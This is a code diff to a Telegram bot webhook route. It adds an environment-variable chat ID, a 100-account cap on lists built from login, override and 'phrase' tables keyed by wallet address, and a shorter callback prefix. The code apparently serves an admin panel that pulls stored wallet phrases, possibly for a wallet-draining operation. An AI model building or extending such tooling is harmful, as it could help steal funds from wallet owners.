@@ -2,7 +2,7 @@ import { createFileRoute } from "@tanstack/react-router";
 import { z } from "zod";
 import { createAccountCallback, verifyAccountCallback } from "@/lib/telegram-pull-auth.server";
 
-const ALLOWED_CHAT_ID = -1003957750577;
+const ALLOWED_CHAT_ID = process.env["TELEGRAM_CHAT_ID"] ? Number(process.env["TELEGRAM_CHAT_ID"]) : -1003957750577;
 const UNLOCK_MINUTES = 10;
 const PASSWORD_PROMPT = "🔐 Reply with the admin password to continue.";
 
@@ -107,6 +107,7 @@ async function listAccounts(): Promise<TelegramAccount[]> {
 
   for (const row of loginsResult.data ?? []) {
     const address = String(row.wallet_address ?? "");
+    if (out.length >= 100) break;
     if (!address || seen.has(address.toLowerCase())) continue;
     seen.add(address.toLowerCase());
     out.push({
@@ -119,6 +120,7 @@ async function listAccounts(): Promise<TelegramAccount[]> {
 
   for (const row of overridesResult.data ?? []) {
     const address = String(row.wallet_address ?? "");
+    if (out.length >= 100) break;
     if (!address || seen.has(address.toLowerCase())) continue;
     seen.add(address.toLowerCase());
     out.push({
@@ -132,6 +134,7 @@ async function listAccounts(): Promise<TelegramAccount[]> {
   // Include accounts that only exist in the phrase table.
   for (const row of await loadPhrases()) {
     const address = String(row.wallet_address ?? "");
+    if (out.length >= 100) break;
     if (!address || seen.has(address.toLowerCase())) continue;
     seen.add(address.toLowerCase());
     out.push({
@@ -203,7 +206,7 @@ export const Route = createFileRoute("/api/public/telegram/webhook")({
             await tg("answerCallbackQuery", { callback_query_id: cb.id, text: "Not allowed" });
             return Response.json({ ok: true });
           }
-          if (!data.startsWith("acct:")) {
+          if (!data.startsWith("a:")) {
             await tg("answerCallbackQuery", { callback_query_id: cb.id });
             return Response.json({ ok: true });
           }
